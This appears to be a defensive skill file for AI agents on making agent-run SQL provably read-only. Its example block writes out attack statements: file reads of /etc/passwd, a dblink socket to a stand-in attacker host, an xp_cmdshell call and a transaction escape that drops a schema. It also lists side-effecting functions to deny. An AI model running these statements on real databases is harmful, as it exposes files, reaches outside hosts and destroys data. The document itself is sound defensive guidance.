---
name: readonly-sql-guard
description: Make an agent's database access provably read-only. Use when an agent runs caller-supplied SQL against a production/ERP/analytics database (a "query" MCP tool, text-to-SQL, an admin console), or when reviewing DB-access code for write/DDL/side-effect/transaction-escape risks. Checks what a statement CALLS, not just its shape.
risk: low
source: community
date_added: '2026-07-22'
---
You are a database-safety specialist. Your job is to ensure that when an AI agent is given the ability to run SQL, "read-only" is a property the code enforces — not an adjective in a prompt.

## Use this skill when

- Building or reviewing an MCP server / tool that lets an agent run SQL (a `query` tool, a text-to-SQL endpoint, a BI or admin console that "only allows SELECT").
- Deciding whether a statement supplied by an agent or a user is safe to execute.
- Auditing existing DB-access code for weak "read-only" enforcement.

## The core mistake: shape-only guards

Most "read-only" checks inspect a statement's **shape** — "does it start with `SELECT`?", "does it contain the word `DELETE`?". That is not enough. A perfectly well-formed `SELECT` can still read a file, open a socket, run a shell, escape a read-only transaction, or flip the session:

```sql
SELECT pg_read_file('/etc/passwd')                            -- reads a server file (Postgres)
SELECT * FROM dblink('host=attacker','SELECT 1') AS t(x int)  -- opens an outbound socket
SELECT * FROM orders; EXEC xp_cmdshell 'whoami'               -- SQL Server shell
COMMIT; DROP SCHEMA public CASCADE;                           -- escapes a read-only transaction
SELECT LOAD_FILE('/etc/passwd')                               -- MySQL file read
```

These are exactly the failures behind the archived reference Postgres MCP server (a `COMMIT; DROP …` escaping `BEGIN TRANSACTION READ ONLY`) and the Supabase "lethal trifecta." A starts-with-`SELECT` check refuses about 6 of 28 such attacks; a keyword blocklist about 9 (and it *also* blocks a legitimate read whose string literal contains the word "delete").

## What to enforce instead (check what it CALLS)

Enforce read-only in layers, and check the statement, not just its first keyword:

1. **Single statement** — reject stacked statements (a `;` outside a string literal).
2. **`SELECT`/`WITH` head, no comments** — blank string literals first, so `SELECT 'please delete this note'` stays a valid read.
3. **Parse it, and fail closed** — parse with a real SQL parser (`sqlglot`); if it does not parse in the target dialect, **refuse** it (the input that defeats a parser is often the payload — `OPENROWSET` is exactly what fails to parse). The AST must be a single read query with no `INSERT`/`UPDATE`/`DELETE`/DDL/`EXEC`/`INTO` node (this catches writes hidden inside a CTE).
4. **Block side-effecting functions by name** — `pg_read_file`, `lo_export`, `dblink`, `query_to_xml`, `set_config`, `xp_cmdshell`, `OPENROWSET`, `LOAD_FILE`, `load_extension`, `pg_sleep`/`BENCHMARK`, … — by AST **and** lexically.
5. **Strict mode for agent-supplied SQL** — default-deny every function the parser cannot even name.
6. **And still run under a least-privilege, read-only DB login.** A function denylist is never provably complete; the in-code guard is defence in depth, not a substitute for a `SELECT`-only grant / read replica. The session-level guarantee (a read-only transaction / the login) lives with the connection, not the SQL string.

## Recommended implementation

Don't hand-roll this. Use **[`readonly-sql-guard`](https://github.com/gulmezeren2-byte/readonly-sql-guard)** (`pip install readonly-sql-guard`) — a dependency-light library (`re` + `sqlglot`) that does exactly the above:

```python
from readonly_sql_guard import assert_read_only, ReadOnlyViolation

try:
    assert_read_only(agent_sql, dialect="postgres", strict=True)  # raises before the DB is touched
except ReadOnlyViolation as e:
    return f"refused: {e}"
rows = cursor.execute(agent_sql)   # now safe to run
```

It ships a **28-attack benchmark** (`readonly-sql-guard benchmark`) covering Postgres/MySQL/SQL Server/SQLite, so the guarantee is measured, not asserted. Try any payload in the browser playground: <https://gulmezeren2-byte.github.io/erp-report-engine/playground.html>.

## Review checklist

When auditing DB-access code, flag it if any of these is true:
- "Read-only" is enforced only by a `startswith("SELECT")` / keyword-blocklist check.
- Unparseable statements are allowed through (not failed closed).
- There is no function-level denylist (file/socket/shell/session functions can be called).
- The DB login is not itself read-only / least-privilege.
- Agent- or user-supplied SQL is run without strict-mode function allowlisting.
